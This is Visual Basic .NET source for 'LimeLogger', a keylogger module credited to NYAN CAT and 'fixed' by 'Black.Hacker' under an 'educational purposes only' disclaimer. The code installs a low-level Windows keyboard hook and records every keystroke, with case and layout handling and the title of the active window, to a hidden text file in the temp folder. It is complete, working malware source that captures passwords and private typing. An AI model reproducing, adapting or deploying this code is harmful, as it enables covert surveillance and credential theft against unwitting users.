Imports System.IO
Imports System.Runtime.InteropServices
Imports System.Text

'   │-----------------------------------------------
'   │ Author     : NYAN CAT
'   │ Name       : LimeLogger v0.2.6.1
'   │ Contact    : https://github.com/NYAN-x-CAT
'   │ Fixed      : Black.Hacker 
'   │-----------------------------------------------
'   This program is distributed for educational purposes only.

Namespace Other
    Module LimeLogger
        Private s As String = New IO.FileInfo(Application.ExecutablePath).Name
        Private ReadOnly loggerPath As String = IO.Path.GetTempPath & "\" & s & ".txt"
        Private CurrentActiveWindowTitle As String
        Function Start()
            _hookID = SetHook(_proc)
            Application.Run()
            Return True
        End Function

        Private Function SetHook(ByVal proc As LowLevelKeyboardProc) As IntPtr
            Using curProcess As Process = Process.GetCurrentProcess()
                Return SetWindowsHookEx(WHKEYBOARDLL, proc, GetModuleHandle(curProcess.ProcessName), 0)
            End Using
        End Function

        Private Function HookCallback(ByVal nCode As Integer, ByVal wParam As IntPtr, ByVal lParam As IntPtr) As IntPtr
            If nCode >= 0 AndAlso wParam = CType(WM_KEYDOWN, IntPtr) Then
                Dim vkCode As Integer = Marshal.ReadInt32(lParam)
                Dim capsLock As Boolean = (GetKeyState(&H14) And &HFFFF) <> 0
                Dim shiftPress As Boolean = (GetKeyState(&HA0) And &H8000) <> 0 OrElse (GetKeyState(&HA1) And &H8000) <> 0
                Dim currentKey As String = KeyboardLayout(CUInt(vkCode))

                If capsLock OrElse shiftPress Then
                    currentKey = currentKey.ToUpper()
                Else
                    currentKey = currentKey.ToLower()
                End If

                If CType(vkCode, Keys) >= Keys.F1 AndAlso CType(vkCode, Keys) <= Keys.F24 Then
                    currentKey = "[" & CType(vkCode, Keys) & "]"
                Else

                    Select Case (CType(vkCode, Keys)).ToString()
                        Case "Space"
                            currentKey = "[SPACE]"
                        Case "Return"
                            currentKey = "[ENTER]"
                        Case "Escape"
                            currentKey = "[ESC]"
                        Case "LControlKey"
                            currentKey = "[CTRL]"
                        Case "RControlKey"
                            currentKey = "[CTRL]"
                        Case "RShiftKey"
                            currentKey = "[Shift]"
                        Case "LShiftKey"
                            currentKey = "[Shift]"
                        Case "Back"
                            currentKey = "[Back]"
                        Case "LWin"
                            currentKey = "[WIN]"
                        Case "Tab"
                            currentKey = "[Tab]"
                        Case "Capital"

                            If capsLock = True Then
                                currentKey = "[CAPSLOCK: OFF]"
                            Else
                                currentKey = "[CAPSLOCK: ON]"
                            End If
                    End Select
                End If

                Using sw As StreamWriter = New StreamWriter(loggerPath, True)

                    If CurrentActiveWindowTitle = GetActiveWindowTitle() Then
                        sw.Write(currentKey)
                    Else
                        sw.WriteLine(Environment.NewLine)
                        sw.WriteLine("### { " & HM() & " - " & GetActiveWindowTitle() & " } ###")
                        sw.Write(currentKey)
                    End If
                End Using
            End If

            Return CallNextHookEx(_hookID, nCode, wParam, lParam)
        End Function
        Public Clock As New Microsoft.VisualBasic.Devices.Clock
        Private Function HM() As String
            Try
                Return Clock.LocalTime.ToString("yy/MM/dd")
            Catch ex As Exception
                Return "??/??/??"
            End Try
        End Function
        Private Function KeyboardLayout(ByVal vkCode As UInteger) As String
            Dim processId As UInteger = Nothing

            Try
                Dim sb As StringBuilder = New StringBuilder()
                Dim vkBuffer As Byte() = New Byte(255) {}
                If Not GetKeyboardState(vkBuffer) Then Return ""
                Dim scanCode As UInteger = MapVirtualKey(vkCode, 0)
                Dim keyboardLayouty As IntPtr = GetKeyboardLayout(GetWindowThreadProcessId(GetForegroundWindow(), processId))
                ToUnicodeEx(vkCode, scanCode, vkBuffer, sb, 5, 0, keyboardLayouty)
                Return sb.ToString()
            Catch
            End Try

            Return (CType(vkCode, Keys)).ToString()
        End Function

        Private Function GetActiveWindowTitle() As String
            Dim pid As UInteger = Nothing

            Try
                Dim hwnd As IntPtr = GetForegroundWindow()
                GetWindowThreadProcessId(hwnd, pid)
                Dim p As Process = Process.GetProcessById(CInt(pid))
                Dim title As String = p.MainWindowTitle
                If String.IsNullOrEmpty(title) Then title = p.ProcessName
                CurrentActiveWindowTitle = System.Text.UTF8Encoding.UTF8.GetString(System.Text.UTF8Encoding.UTF8.GetBytes(title))
                Return title
            Catch __unusedException1__ As Exception
                Return "???"
            End Try
        End Function

        Private Const WM_KEYDOWN As Integer = &H100
        Private _proc As LowLevelKeyboardProc = AddressOf HookCallback
        Private _hookID As IntPtr = IntPtr.Zero
        <DllImport("user32.dll", CharSet:=CharSet.Auto, SetLastError:=True)>
        Private Function SetWindowsHookEx(ByVal idHook As Integer, ByVal lpfn As LowLevelKeyboardProc, ByVal hMod As IntPtr, ByVal dwThreadId As UInteger) As IntPtr
        End Function
        <DllImport("user32.dll", CharSet:=CharSet.Auto, SetLastError:=True)>
        Private Function UnhookWindowsHookEx(ByVal hhk As IntPtr) As <MarshalAs(UnmanagedType.Bool)> Boolean
        End Function
        <DllImport("user32.dll", CharSet:=CharSet.Auto, SetLastError:=True)>
        Private Function CallNextHookEx(ByVal hhk As IntPtr, ByVal nCode As Integer, ByVal wParam As IntPtr, ByVal lParam As IntPtr) As IntPtr
        End Function
        <DllImport("kernel32.dll", CharSet:=CharSet.Auto, SetLastError:=True)>
        Private Function GetModuleHandle(ByVal lpModuleName As String) As IntPtr
        End Function
        Private WHKEYBOARDLL As Integer = 13
        Private Delegate Function LowLevelKeyboardProc(ByVal nCode As Integer, ByVal wParam As IntPtr, ByVal lParam As IntPtr) As IntPtr
        <DllImport("user32.dll")>
        Private Function GetForegroundWindow() As IntPtr
        End Function
        <DllImport("user32.dll", SetLastError:=True)>
        Private Function GetWindowThreadProcessId(ByVal hWnd As IntPtr, <Out> ByRef lpdwProcessId As UInteger) As UInteger
        End Function
        <DllImport("user32.dll", CharSet:=CharSet.Auto, ExactSpelling:=True, CallingConvention:=CallingConvention.Winapi)>
        Function GetKeyState(ByVal keyCode As Integer) As Short
        End Function
        <DllImport("user32.dll", SetLastError:=True)>
        Private Function GetKeyboardState(ByVal lpKeyState As Byte()) As <MarshalAs(UnmanagedType.Bool)> Boolean
        End Function
        <DllImport("user32.dll")>
        Private Function GetKeyboardLayout(ByVal idThread As UInteger) As IntPtr
        End Function
        <DllImport("user32.dll")>
        Private Function ToUnicodeEx(ByVal wVirtKey As UInteger, ByVal wScanCode As UInteger, ByVal lpKeyState As Byte(),
        <Out, MarshalAs(UnmanagedType.LPWStr)> ByVal pwszBuff As StringBuilder, ByVal cchBuff As Integer, ByVal wFlags As UInteger, ByVal dwhkl As IntPtr) As Integer
        End Function
        <DllImport("user32.dll")>
        Private Function MapVirtualKey(ByVal uCode As UInteger, ByVal uMapType As UInteger) As UInteger
        End Function
    End Module
End Namespace
